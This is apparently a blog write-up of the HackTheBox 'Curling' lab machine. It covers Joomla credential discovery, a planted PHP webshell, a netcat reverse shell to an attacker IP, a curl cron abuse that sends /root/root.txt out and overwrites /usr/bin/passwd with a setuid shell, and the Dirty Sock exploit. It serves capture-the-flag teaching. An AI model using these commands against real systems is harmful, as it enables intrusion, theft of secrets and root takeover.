---
title: HTB: Curling
url: https://0xdf.gitlab.io/2019/03/30/htb-curling.html
date: 2019-03-30T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: ctf, hackthebox, htb-curling, nmap, joomla, searchsploit, webshell, cron, pspy, curl, suid, cve-2019-7304, dirty-sock, ubuntu, exploit, htb-sunday, arbitrary-write
---

![Curling-cover](https://0xdfimages.gitlab.io/img/curling-cover.png)

Curling was a solid box easy box that provides a chance to practice some basic enumeration to find a password, using that password to get access to a Joomla instance, and using the access to get a shell. With a shell, I’ll find a compressed and encoded backup file, that after a bit of unpacking, gives a password to privesc to the next user. As that user, I’ll find a root cron running curl with the option to use a configuration file. It happens that I can control that file, and use it to get the root flag and a root shell. In Beyond root, I’ll look at how setuid applies to scripts on most Linux flavors (and how it’s different from Solaris as I showed with Sunday), and how the Dirty Sock snapd vulnerability from a couple months ago will work here to go to root.

## Box Info

| Name | [Curling](https://hackthebox.com/machines/curling)  [Curling](https://hackthebox.com/machines/curling) [Play on HackTheBox](https://hackthebox.com/machines/curling) |
| --- | --- |
| Release Date | [27 Oct 2018](https://twitter.com/hackthebox_eu/status/1055580504332922882) |
| Retire Date | 23 Mar 2019 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Curling |
| Radar Graph | Radar chart for Curling |
| First Blood User | 00:33:05[owodelta owodelta](https://app.hackthebox.com/users/28238) |
| First Blood Root | 00:44:09[owodelta owodelta](https://app.hackthebox.com/users/28238) |
| Creator | [L4mpje L4mpje](https://app.hackthebox.com/users/29267) |

## Recon

### nmap

`nmap` shows just http (80) and ssh (22):

```

root@kali# nmap -sT -p- --min-rate 5000 -oA nmap/alltcp 10.10.10.150
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-29 14:58 EDT
Nmap scan report for 10.10.10.150
Host is up (0.018s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds
root@kali# nmap -p 22,80 -sV -sC -oA nmap/scripts 10.10.10.150
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-29 14:58 EDT
Nmap scan report for 10.10.10.150
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds

```

HTTP looks to be hosting Joomla, and based on the versions of both [OpenSSH](https://launchpad.net/ubuntu/+source/openssh) and [Apache2](https://launchpad.net/ubuntu/+source/apache2), this looks like Ubuntu 18.04 / Bionic Beaver.

### Joomla - TCP 80

#### Site

The page is a Joomla CMS hosted Curling site:

![1540841063612](https://0xdfimages.gitlab.io/img/1540841063612.png)

The posts are written by Super User, and one is signed “Floris”:

![1540841223259](https://0xdfimages.gitlab.io/img/1540841223259.png)

I’ll also notice that there’s a comment in the html source at the very bottom:

```

...[snip]...
</body>
      <!-- secret.txt -->
</html>

```

#### Version

Some googling showed I can [get the Joomla version](https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http) by checking `/administrator/manifests/files/joomla.xml`:

```

root@kali# curl -s 10.10.10.150/administrator/manifests/files/joomla.xml | head
<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
        <name>files_joomla</name>
        <author>Joomla! Project</author>
        <authorEmail>admin@joomla.org</authorEmail>
        <authorUrl>www.joomla.org</authorUrl>
        <copyright>(C) 2005 - 2018 Open Source Matters. All rights reserved</copyright>
        <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
        <version>3.8.8</version>
        <creationDate>May 2018</creationDate>

```

I can see the version of 3.8.8 in the second to last line. That’s not the newest version. In fact, it was released in [May 2018](https://docs.joomla.org/Joomla_3.8_version_history). That could have been the latest version while this box was being made, or the version with an exploit that I’m to target. I’ll check `searchsploit`, and not find anything interesting:

```

root@kali# searchsploit joomla 3.8
------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                   |  Path
                                                                                                 | (/usr/share/exploitdb/)
------------------------------------------------------------------------------------------------- ----------------------------------------
Joomla! Component Appointments for JomSocial 3.8.1 - SQL Injection                               | exploits/php/webapps/41462.txt
Joomla! Component ContentMap 1.3.8 - 'contentid' SQL Injection                                   | exploits/php/webapps/41427.txt
Joomla! Component Reverse Auction Factory 4.3.8 - SQL Injection                                  | exploits/php/webapps/45475.txt
Joomla! Component Social Factory 3.8.3 - SQL Injection                                           | exploits/php/webapps/45470.txt
Joomla! Component Store for K2 3.8.2 - SQL Injection                                             | exploits/php/webapps/41440.txt
------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

```

#### /secret.txt

Based on the comment, I’ll check out `/secret.txt`. The string it gives looks base64 encoded, so I’ll decode it:

```

root@kali# curl http://10.10.10.150/secret.txt
Q3VybGluZzIwMTgh

root@kali# curl -s http://10.10.10.150/secret.txt | base64 -d
Curling2018!

```

I’m guessing that based on the title of the website I’m supposed to use `cewl` to build a wordlist, but I managed to log in after a few guesses with floris / Curling2018!:

![1553252909191](https://0xdfimages.gitlab.io/img/1553252909191.png)

#### /administrator

A bit of googling shows me that to access the [admin panel on a Joomla site](https://www.siteground.com/tutorials/joomla/how-to-login/), I should visit `/administrator`. I’ll log in as floris:

![1540841323832](https://0xdfimages.gitlab.io/img/1540841323832.png)

## Shell as www-data

### Webshell

From the admin panel, it’s simple to get a webshell. I need to find a place I can put php code. I’ll do that in the templates, which by definition are going to be code.

First I’ll go to Extensions –> Templates (ignore the sub-menu and click the first Templates):

![1540841387578](https://0xdfimages.gitlab.io/img/1540841387578.png)

There it will show the two templates, including the one that’s in use, protostar:

![1540841449525](https://0xdfimages.gitlab.io/img/1540841449525.png)

I’ll add a file to the one that’s not in use to be a bit stealthier. So I’ll click on the other one, Beez3, in the Template column (not in the Style column):

![1540841513843](https://0xdfimages.gitlab.io/img/1540841513843.png)

Click New File:

![1540841570925](https://0xdfimages.gitlab.io/img/1540841570925.png)

Enter a file name and select a file type php. Hit create. Now I’m taken to an editor. I’ll add a simple php shell, and hit save at the top left of the page:

![1540841639094](https://0xdfimages.gitlab.io/img/1540841639094.png)

That page can be accessed at `http://10.10.10.150/templates/beez3/sh3ll.php`. So to run `id`, `http://10.10.10.150/templates/beez3/sh3ll.php?0xdf=id`:

![1540841695686](https://0xdfimages.gitlab.io/img/1540841695686.png)

### Shell

To get an interactive shell, I’ll just execute a fifo nc shell over the webshell: `http://10.10.10.150/templates/beez3/sh3ll.php?0xdf=cat%20/tmp/df%20|%20/bin/sh%20-i%202%3E%261%20|%20nc%2010.10.14.5%20443%20%3E%20/tmp/df`

It’s important to make sure that at least the `&` is encoded as `%26`, else the browser will handle it as a new parameter in the url.

```

root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.150] 36696
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

## Privesc: www-data to floris

### password\_backup

In the floris home dir, there’s a file named `password_backup`. It’s a hex dump that looks like the output of `xxd`:

```

www-data@curling:/home/floris$ cat password_backup 
00000000: 425a 6839 3141 5926 5359 819b bb48 0000  BZh91AY&SY...H..
00000010: 17ff fffc 41cf 05f9 5029 6176 61cc 3a34  ....A...P)ava.:4
00000020: 4edc cccc 6e11 5400 23ab 4025 f802 1960  N...n.T.#.@%...`
00000030: 2018 0ca0 0092 1c7a 8340 0000 0000 0000   ......z.@......
00000040: 0680 6988 3468 6469 89a6 d439 ea68 c800  ..i.4hdi...9.h..
00000050: 000f 51a0 0064 681a 069e a190 0000 0034  ..Q..dh........4
00000060: 6900 0781 3501 6e18 c2d7 8c98 874a 13a0  i...5.n......J..
00000070: 0868 ae19 c02a b0c1 7d79 2ec2 3c7e 9d78  .h...*..}y..<~.x
00000080: f53e 0809 f073 5654 c27a 4886 dfa2 e931  .>...sVT.zH....1
00000090: c856 921b 1221 3385 6046 a2dd c173 0d22  .V...!3.`F...s."
000000a0: b996 6ed4 0cdb 8737 6a3a 58ea 6411 5290  ..n....7j:X.d.R.
000000b0: ad6b b12f 0813 8120 8205 a5f5 2970 c503  .k./... ....)p..
000000c0: 37db ab3b e000 ef85 f439 a414 8850 1843  7..;.....9...P.C
000000d0: 8259 be50 0986 1e48 42d5 13ea 1c2a 098c  .Y.P...HB....*..
000000e0: 8a47 ab1d 20a7 5540 72ff 1772 4538 5090  .G.. .U@r..rE8P.
000000f0: 819b bb48                                ...H

```

Looking at the first 3 bytes, I’ll see `BZh`, the [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) for a .bz2 file.

I’ll convert back to binary with `xxd` and `-r` for reverse:

```

root@kali# cat password_backup_orig | xxd -r > password_backup.bz2
root@kali# file password_backup.bz2 
password_backup.bz2: bzip2 compressed data, block size = 900k

```

And decompress:

```

root@kali# bunzip2 -k password_backup.bz2

```

I’ll check the file type on the resulting file, and see it’s a gzipped:

```

root@kali# file password_backup
password_backup: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size 141                                                                                   
root@kali# mv password_backup password_backup.gz

```

I’ll decompress, and examine. Another bz2:

```

root@kali# gunzip -k password_backup.gz
root@kali# ls
password_backup  password_backup.bz2  password_backup.gz  password_backup_orig
root@kali# file password_backup
password_backup: bzip2 compressed data, block size = 900k
root@kali# mv password_backup password_backup2.bz2

```

Decompress again, and get a tar archive:

```

root@kali# bunzip2 -k password_backup2.bz2
root@kali# ls -l
total 48
-rwxrwx--- 1 root vboxsf 10240 Oct 29 16:25 password_backup2
-rwxrwx--- 1 root vboxsf   141 Oct 29 16:25 password_backup2.bz2
-rwxrwx--- 1 root vboxsf   244 Oct 29 16:25 password_backup.bz2
-rwxrwx--- 1 root vboxsf   173 Oct 29 16:25 password_backup.gz
-rwxrwx--- 1 root vboxsf  1076 Oct 29 16:22 password_backup_orig
root@kali# file password_backup2
password_backup2: POSIX tar archive (GNU)

```

Decompress, and get a textfile with a password:

```

root@kali# mv password_backup2 password_backup.tar

root@kali# tar xvf password_backup.tar
password.txt

root@kali# ls -l
total 56
-rwxrwx--- 1 root vboxsf   141 Oct 29 16:25 password_backup2.bz2
-rwxrwx--- 1 root vboxsf   244 Oct 29 16:25 password_backup.bz2
-rwxrwx--- 1 root vboxsf   173 Oct 29 16:25 password_backup.gz
-rwxrwx--- 1 root vboxsf  1076 Oct 29 16:22 password_backup_orig
-rwxrwx--- 1 root vboxsf 10240 Oct 29 16:25 password_backup.tar
-rwxrwx--- 1 root vboxsf    19 May 22 15:15 password.txt
root@kali# cat password.txt
5d<wdCbdZu)|hChXll

```

This kind of chain of compressions is also a good chance to show off [CyberChef](https://gchq.github.io/CyberChef/). I’ll paste the hex dump into “Input”, and then start moving in “Recipes”, making use of the “Detect File Type” recipe to see what’s next until the end:

[![cyberchef gif](https://0xdfimages.gitlab.io/img/curling-cyberchef.gif)*Click for full size image*](https://0xdfimages.gitlab.io/img/curling-cyberchef.gif)

Also, once you have what you like, your entire session is available to share via a url. Mine is [here](https://gchq.github.io/CyberChef/#recipe=From_Hexdump()Bzip2_Decompress()Gunzip()Bzip2_Decompress()Untar()Detect_File_Type(true,true,true,true,true,true,true/disabled)&input=MDAwMDAwMDA6IDQyNWEgNjgzOSAzMTQxIDU5MjYgNTM1OSA4MTliIGJiNDggMDAwMCAgQlpoOTFBWSZTWS4uLkguLgowMDAwMDAxMDogMTdmZiBmZmZjIDQxY2YgMDVmOSA1MDI5IDYxNzYgNjFjYyAzYTM0ICAuLi4uQS4uLlApYXZhLjo0CjAwMDAwMDIwOiA0ZWRjIGNjY2MgNmUxMSA1NDAwIDIzYWIgNDAyNSBmODAyIDE5NjAgIE4uLi5uLlQuIy5AJS4uLmAKMDAwMDAwMzA6IDIwMTggMGNhMCAwMDkyIDFjN2EgODM0MCAwMDAwIDAwMDAgMDAwMCAgIC4uLi4uLnouQC4uLi4uLgowMDAwMDA0MDogMDY4MCA2OTg4IDM0NjggNjQ2OSA4OWE2IGQ0MzkgZWE2OCBjODAwICAuLmkuNGhkaS4uLjkuaC4uCjAwMDAwMDUwOiAwMDBmIDUxYTAgMDA2NCA2ODFhIDA2OWUgYTE5MCAwMDAwIDAwMzQgIC4uUS4uZGguLi4uLi4uLjQKMDAwMDAwNjA6IDY5MDAgMDc4MSAzNTAxIDZlMTggYzJkNyA4Yzk4IDg3NGEgMTNhMCAgaS4uLjUubi4uLi4uLkouLgowMDAwMDA3MDogMDg2OCBhZTE5IGMwMmEgYjBjMSA3ZDc5IDJlYzIgM2M3ZSA5ZDc4ICAuaC4uLiouLn15Li48fi54CjAwMDAwMDgwOiBmNTNlIDA4MDkgZjA3MyA1NjU0IGMyN2EgNDg4NiBkZmEyIGU5MzEgIC4%2BLi4uc1ZULnpILi4uLjEKMDAwMDAwOTA6IGM4NTYgOTIxYiAxMjIxIDMzODUgNjA0NiBhMmRkIGMxNzMgMGQyMiAgLlYuLi4hMy5gRi4uLnMuIgowMDAwMDBhMDogYjk5NiA2ZWQ0IDBjZGIgODczNyA2YTNhIDU4ZWEgNjQxMSA1MjkwICAuLm4uLi4uN2o6WC5kLlIuCjAwMDAwMGIwOiBhZDZiIGIxMmYgMDgxMyA4MTIwIDgyMDUgYTVmNSAyOTcwIGM1MDMgIC5rLi8uLi4gLi4uLilwLi4KMDAwMDAwYzA6IDM3ZGIgYWIzYiBlMDAwIGVmODUgZjQzOSBhNDE0IDg4NTAgMTg0MyAgNy4uOy4uLi4uOS4uLlAuQwowMDAwMDBkMDogODI1OSBiZTUwIDA5ODYgMWU0OCA0MmQ1IDEzZWEgMWMyYSAwOThjICAuWS5QLi4uSEIuLi4uKi4uCjAwMDAwMGUwOiA4YTQ3IGFiMWQgMjBhNyA1NTQwIDcyZmYgMTc3MiA0NTM4IDUwOTAgIC5HLi4gLlVAci4uckU4UC4KMDAwMDAwZjA6IDgxOWIgYmI0OCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLi4uSA).

### Shell as floris

I can use that password to `su` as floris:

```

www-data@curling:/home/floris$ su - floris
Password:
floris@curling:~$

```

I can also now ssh in as floris:

```

root@kali# ssh floris@10.10.10.150
The authenticity of host '10.10.10.150 (10.10.10.150)' can't be established.
ECDSA key fingerprint is SHA256:o1Cqn+GlxiPRiKhany4ZMStLp3t9ePE9GjscsUsEjWM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.150' (ECDSA) to the list of known hosts.
floris@10.10.10.150's password: 
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-22-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Oct 29 20:29:02 UTC 2018

  System load:  0.0               Processes:            198
  Usage of /:   46.7% of 9.78GB   Users logged in:      0
  Memory usage: 27%               IP address for ens33: 10.10.10.150
  Swap usage:   0%
 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

Last login: Mon May 28 17:00:48 2018 from 192.168.1.71
floris@curling:~$

```

And there’s user.txt:

```

floris@curling:~$ cat user.txt 
65dd1df0...

```

## Privesc: floris to root

### Enumeration

#### Admin Area

As floris, I can access `/home/floris/admin-area`:

```

floris@curling:~$ ls -l
total 12
drwxr-x--- 2 root   floris 4096 May 22  2018 admin-area
-rw-r--r-- 1 floris floris 1076 May 22  2018 password_backup
-rw-r----- 1 floris floris   33 May 22  2018 user.txt

floris@curling:~/admin-area$ ls 
input  report

```

```

floris@curling:~/admin-area$ cat input 
url = "http://127.0.0.1"

floris@curling:~/admin-area$ head report
<!DOCTYPE html>
<html lang="en-gb" dir="ltr">
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <meta charset="utf-8" />
        <base href="http://127.0.0.1/" />
        <meta name="description" content="best curling site on the planet!" />
        <meta name="generator" content="Joomla! - Open Source Content Management" />
        <title>Home</title>
        <link href="/index.php?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />

```

#### Identify cron

I uploaded and ran `pspy` to look for recurring jobs, and found this:

```

2018/10/29 21:06:01 CMD: UID=0    PID=25426  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2018/10/29 21:06:01 CMD: UID=0    PID=25425  | sleep 1 
2018/10/29 21:06:01 CMD: UID=0    PID=25424  | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
2018/10/29 21:06:01 CMD: UID=0    PID=25423  | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
2018/10/29 21:06:01 CMD: UID=0    PID=25421  | /usr/sbin/CRON -f 
2018/10/29 21:06:01 CMD: UID=0    PID=25420  | /usr/sbin/CRON -f 

```

#### curl -K

The `-K` option on `curl` is interesting. Based on [the man page](https://curl.haxx.se/docs/manpage.html#-K), it allows the user to give arguments in a file that will be treated as if they were on the command line. The text file must have “Options and their parameters must be specified on the same line in the file, separated by whitespace, colon, or the equals sign”.

### Read Root.txt

First, to just read the flag, I’ll change `input` to:

```

url = "http://10.10.14.5"
data = @/root/root.txt

```

`@` is used to reference a file, so that says use the content of `root.txt` as the POST data.

I’ll listen with `nc`, and catch the POST request with the flag in the data:

```

root@kali# nc -nlvp 80
listening on [any] 80 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.150] 35754
POST / HTTP/1.1
Host: 10.10.14.5
User-Agent: curl/7.58.0
Accept: */*
Content-Length: 32
Content-Type: application/x-www-form-urlencoded

82c198ab...

```

Alternatively, I typically think of curl as getting a file over http. But it can also take a url for a local file on the host:

```

url = "file:///root/root.txt"
output = /tmp/.0xdf

```

After the minute:

```

floris@curling:~/admin-area$ cat /tmp/.0xdf 
82c198ab...

```

### root Shell

Obviously I want a shell. There are several paths to get it with arbitrary write as root. I’ll overwrite a setuid binary.

First, I need to create my own binary that will give me a shell without dropping privileges. I’ll with some simple c code:

```

void main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh","sh",0);
}

```

I’ll compile (warnings are fine):

```

root@kali# gcc -o setuid setuid.c                                                                                                                                            
setuid.c: In function ‘main’:
setuid.c:2:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^~~~~~
setuid.c:3:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^~~~~~
setuid.c:4:5: warning: implicit declaration of function ‘execl’ [-Wimplicit-function-declaration]
     execl("/bin/sh","sh",0);
     ^~~~~
setuid.c:4:5: warning: incompatible implicit declaration of built-in function ‘execl’

```

Serve with python:

```

root@kali# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

I’ll look for a setuid root binary to overwrite:

```

floris@curling:/$ find / -type f -user root -perm -4000 -ls 2>/dev/null
       64     40 -rwsr-xr-x   1 root     root        40152 Nov 30  2017 /snap/core/4486/bin/mount
       78     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/4486/bin/ping
       79     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/4486/bin/ping6
       96     40 -rwsr-xr-x   1 root     root        40128 May 17  2017 /snap/core/4486/bin/su
      114     27 -rwsr-xr-x   1 root     root        27608 Nov 30  2017 /snap/core/4486/bin/umount
     2706     71 -rwsr-xr-x   1 root     root        71824 May 17  2017 /snap/core/4486/usr/bin/chfn
     2708     40 -rwsr-xr-x   1 root     root        40432 May 17  2017 /snap/core/4486/usr/bin/chsh
     2783     74 -rwsr-xr-x   1 root     root        75304 May 17  2017 /snap/core/4486/usr/bin/gpasswd
     2873     39 -rwsr-xr-x   1 root     root        39904 May 17  2017 /snap/core/4486/usr/bin/newgrp
     2886     53 -rwsr-xr-x   1 root     root        54256 May 17  2017 /snap/core/4486/usr/bin/passwd
     2996    134 -rwsr-xr-x   1 root     root       136808 Jul  4  2017 /snap/core/4486/usr/bin/sudo
     3095     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jan 12  2017 /snap/core/4486/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3463    419 -rwsr-xr-x   1 root     root              428240 Jan 18  2018 /snap/core/4486/usr/lib/openssh/ssh-keysign
     6465     93 -rwsr-sr-x   1 root     root               94344 Apr 16  2018 /snap/core/4486/usr/lib/snapd/snap-confine
     7630    382 -rwsr-xr--   1 root     dip               390888 Jan 29  2016 /snap/core/4486/usr/sbin/pppd
     1829    428 -rwsr-xr-x   1 root     root              436552 Feb 10  2018 /usr/lib/openssh/ssh-keysign
     8075     80 -rwsr-xr-x   1 root     root               80056 Apr  2  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
     5197    100 -rwsr-sr-x   1 root     root              101208 May 11 12:36 /usr/lib/snapd/snap-confine
     1335     12 -rwsr-xr-x   1 root     root               10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
     1328     44 -rwsr-xr--   1 root     messagebus         42992 Nov 15  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1851     16 -rwsr-xr-x   1 root     root               14328 Mar 27  2018 /usr/lib/policykit-1/polkit-agent-helper-1
      957     40 -rwsr-xr-x   1 root     root               37136 Jan 25  2018 /usr/bin/newgidmap
      738     44 -rwsr-xr-x   1 root     root               44528 Jan 25  2018 /usr/bin/chsh
      996     24 -rwsr-xr-x   1 root     root               22520 Mar 27  2018 /usr/bin/pkexec
      736     76 -rwsr-xr-x   1 root     root               76496 Jan 25  2018 /usr/bin/chfn
      959     40 -rwsr-xr-x   1 root     root               37136 Jan 25  2018 /usr/bin/newuidmap
      958     40 -rwsr-xr-x   1 root     root               40344 Jan 25  2018 /usr/bin/newgrp
      830     76 -rwsr-xr-x   1 root     root               75824 Jan 25  2018 /usr/bin/gpasswd
      976     60 -rwsr-xr-x   1 root     root               59640 Jan 25  2018 /usr/bin/passwd
     1105    148 -rwsr-xr-x   1 root     root              149080 Jan 18  2018 /usr/bin/sudo
     1141     20 -rwsr-xr-x   1 root     root               18448 Mar  9  2017 /usr/bin/traceroute6.iputils
   393370     28 -rwsr-xr-x   1 root     root               26696 Mar 15  2018 /bin/umount
   393285     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount
   393352     44 -rwsr-xr-x   1 root     root               44664 Jan 25  2018 /bin/su
   393320    144 -rwsr-xr-x   1 root     root              146128 Nov 30  2017 /bin/ntfs-3g
   393336     64 -rwsr-xr-x   1 root     root               64424 Mar  9  2017 /bin/ping
   393312     44 -rwsr-xr-x   1 root     root               43088 Mar 15  2018 /bin/mount

```

`passwd` seems like one that no one will be using here. I’ll change input so that it overwrites `passwd`:

```

url = "http://10.10.14.5/setuid"
output = /usr/bin/passwd

```

Next time it runs, I can run `passwd`, and get a shell:

```

floris@curling:/$ /usr/bin/passwd
# id
uid=0(root) gid=0(root) groups=0(root),1004(floris)

```

## Beyond Root

### Dirty Sock

Sortly after CVE-2019-7304 was released, I gave Dirty Sock a spin on various HackTheBox machines. While I didn’t say so [in my post at the time](/2019/02/13/playing-with-dirty-sock.html), Curling was one of the boxes that this exploit worked on.

I can check the snapd version, and see it is vulnerable:

```

floris@curling:~$ snap version
snap    2.32.8+18.04
snapd   2.32.8+18.04
series  16
ubuntu  18.04
kernel  4.15.0-22-generic

```

Next, after I upload a copy of the exploit, I’ll run it. On completion, it will have added an account dirty\_sock, with password dirty\_sock, that can sudo.

```

floris@curling:/dev/shm$ python3 dirty_sockv2.py                                                                                                                                                                           

      ___  _ ____ ___ _   _     ____ ____ ____ _  _
      |  \ | |__/  |   \_/      [__  |  | |    |_/
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//

[+] Slipped dirty sock on random socket file: /tmp/tackehoggv;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...
********************
Success! You can now `su` to the following account and use sudo:
   username: dirty_sock
   password: dirty_sock
********************

```

Now I’ll test it out. First, `su` to dirty\_sock:

```

floris@curling:/dev/shm$ su dirty_sock
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

dirty_sock@curling:/dev/shm$

```

Now, as dirty\_sock, `sudo`:

```

dirty_sock@curling:/dev/shm$ sudo su
[sudo] password for dirty_sock: 
root@curling:/dev/shm# id
uid=0(root) gid=0(root) groups=0(root)
root@curling:/dev/shm#

```

### setuid Scripts

When I had arbitrary file write as root on Sunday, I overwrote a setuid binary, `troll`, [with a python script that made a root shell, and it worked](/2018/09/29/htb-sunday.html#overwrite-troll). The same thing did not work here.

It turns out that most Linux distributions don’t allow setuid on files that use “#!interpreter” to define what runs the file, but Solaris does. So I can do this on Sunday, but not most Linux boxes.